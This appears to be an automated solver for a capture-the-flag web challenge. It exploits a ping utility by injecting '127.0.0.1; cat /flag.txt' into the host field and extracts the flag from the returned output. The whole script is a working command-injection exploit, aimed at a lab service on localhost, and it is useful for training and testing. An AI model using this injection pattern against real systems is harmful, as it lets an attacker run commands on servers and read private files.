#!/usr/bin/env python3
"""Automated solver for challenge 4 - ping-utility.

Steps:
  1. POST a normal host and confirm the page does not already leak the flag.
  2. POST `127.0.0.1; cat /flag.txt`, which ends the ping command and chains
     `cat` through the shell the server uses.
  3. Print the flag found in the returned output.
"""

import re
import sys

import requests

FLAG_RE = re.compile(r"ingehack\{[^}]+\}")
PAYLOAD = "127.0.0.1; cat /flag.txt"


def log(message):
    print("[*] " + message, file=sys.stderr)


def fail(message):
    print("[-] " + message, file=sys.stderr)
    sys.exit(1)


def main():
    base = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:8004"
    session = requests.Session()

    # 1. Sanity check: a plain ping must not expose the flag.
    normal = session.post(base + "/ping", data={"host": "127.0.0.1"}, timeout=15)
    normal.raise_for_status()
    if FLAG_RE.search(normal.text):
        fail("the flag is already visible on a normal ping")
    log("normal ping does not expose the flag")

    # 2. Command injection: the semicolon ends the ping command and starts a
    #    new one in the same shell.
    injected = session.post(base + "/ping", data={"host": PAYLOAD}, timeout=15)
    injected.raise_for_status()
    log("sent payload: " + PAYLOAD)

    # 3. The chained command's stdout/stderr is returned in the output box.
    match = FLAG_RE.search(injected.text)
    if not match:
        fail("flag not found after command injection")
    print(match.group(0))


if __name__ == "__main__":
    main()
